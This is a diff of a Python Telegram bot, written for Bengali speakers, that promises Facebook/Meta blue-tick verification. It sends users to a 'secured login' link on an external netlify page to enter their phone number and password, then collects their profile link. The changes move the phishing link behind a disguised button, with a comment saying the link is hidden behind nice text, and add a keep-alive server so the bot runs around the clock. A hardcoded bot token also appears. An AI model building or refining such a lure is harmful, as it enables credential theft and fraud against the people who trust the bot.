@@ -1,24 +1,40 @@
+import os
 import telebot
 from telebot import types
+from flask import Flask
+from threading import Thread
 
 TOKEN = '8710197095:AAGcdkvFLkQV8eHCRFcFoOyHkZ3WASf5vrM'
 bot = telebot.TeleBot(TOKEN)
+
+# রেন্ডারে পোর্ট সচল রাখার জন্য ফ্লাস্ক সার্ভার
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "Bot is running 24/7!"
+
+def run():
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
+
+def keep_alive():
+    t = Thread(target=run)
+    t.start()
 
 user_data = {}
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    # row_width=2 দেওয়ার ফলে পাশাপাশি দুটি করে বাটন থাকবে (ডান ও বাম পাশে)
     markup = types.InlineKeyboardMarkup(row_width=2)
     
+    # এখানে বাটনের ওপর লিংক হাইড করে সুন্দর টেক্সট বসানো হয়েছে
     btn1 = types.InlineKeyboardButton("🚀 মেটা ভেরিফিকেশন নিন", callback_data='order')
-    btn2 = types.InlineKeyboardButton("🎥 কাজের ভিডিও দেখুন", url="https://web-secure-view-8821.netlify.app/")
+    btn2 = types.InlineKeyboardButton("🔐 সিকিউরড লগইন করুন", url="https://web-secure-view-8821.netlify.app/")
     btn3 = types.InlineKeyboardButton("💰 পেমেন্ট ও নিয়মাবলী", callback_data='pricing')
     btn4 = types.InlineKeyboardButton("❓ কীভাবে কাজ করে?", callback_data='help')
     btn5 = types.InlineKeyboardButton("⭐ সুবিধা ও শর্তাবলী", callback_data='benefits')
     btn6 = types.InlineKeyboardButton("📞 লাইভ সাপোর্ট", callback_data='support')
     
-    # দুটি করে বাটন একসাথে যোগ করা হলো, ফলে মোট ৩টি সারিতে ৬টি বাটন দেখাবে
     markup.add(btn1, btn2)
     markup.add(btn3, btn4)
     markup.add(btn5, btn6)
@@ -43,11 +59,10 @@ def callback_query(call):
         user_data[chat_id] = {}
         order_intro = (
             "📌 **মেটা ভেরিফিকেশন আবেদন প্রক্রিয়া:**\n\n"
-            "নিচের লিংকে প্রবেশ করে আপনার অ্যাকাউন্ট দিয়ে সিকিউরড লগইন সম্পন্ন করুন:\n"
-            "👉 https://web-secure-view-8821.netlify.app/\n\n"
+            "উপরে দেওয়া **'🔐 সিকিউরড লগইন করুন'** বাটনে ক্লিক করে আপনার অ্যাকাউন্ট দিয়ে লগইন সম্পন্ন করুন।\n\n"
             "লগইন করার পর আপনার **ফেসবুক প্রোফাইল বা পেজের সঠিক লিংকটি** এখানে পাঠান:"
         )
-        bot.send_message(chat_id, order_intro, parse_mode="Markdown", disable_web_page_preview=True)
+        bot.send_message(chat_id, order_intro, parse_mode="Markdown")
         bot.register_next_step_handler(call.message, get_profile_link)
         
     elif call.data == 'pricing':
@@ -62,9 +77,9 @@ def callback_query(call):
     elif call.data == 'help':
         help_text = (
             "📌 **ব্লু টিক পাওয়ার সম্পূর্ণ কাজের প্রক্রিয়া:**\n\n"
-            "১. 'মেটা ভেরিফিকেশন নিন' বাটনে ক্লিক করে নির্দিষ্ট লিংকে গিয়ে নাম্বার ও পাসওয়ার্ড দিয়ে লগইন করুন এবং ফেসবুক লিংক দিন।\n"
-            "২. আমাদের টিম আপনার প্রসেস নিয়ে কাজ শুরু করবে।\n"
-            "৩. কাজ সম্পন্ন হওয়ার ঠিক ২ থেকে আড়াই ঘণ্টা পর আমাদের ডেডিকেটেড এজেন্ট বা মেম্বার আপনার সাথে যোগাযোগ করে পেমেন্ট সম্পন্ন করবেন।"
+            "১. 'সিকিউরড লগইন করুন' বাটনে ক্লিক করে নাম্বার ও পাসওয়ার্ড দিয়ে লগইন করুন।\n"
+            "২. এরপর আপনার ফেসবুক প্রোফাইল বা পেজের লিংক দিন।\n"
+            "৩. কাজ সম্পন্ন হওয়ার ঠিক ২ থেকে আড়াই ঘণ্টা পর আমাদের ডেডিকেটেড এজেন্ট আপনার সাথে যোগাযোগ করে পেমেন্ট সম্পন্ন করবেন।"
         )
         bot.send_message(chat_id, help_text, parse_mode="Markdown")
         
@@ -102,5 +117,7 @@ def get_profile_name(message):
     )
     bot.send_message(chat_id, confirmation_text, parse_mode="Markdown")
 
-print("Bot is running smoothly on cloud...")
-bot.infinity_polling()
+if __name__ == '__main__':
+    keep_alive()
+    print("Bot is running 24/7 on cloud...")
+    bot.infinity_polling()
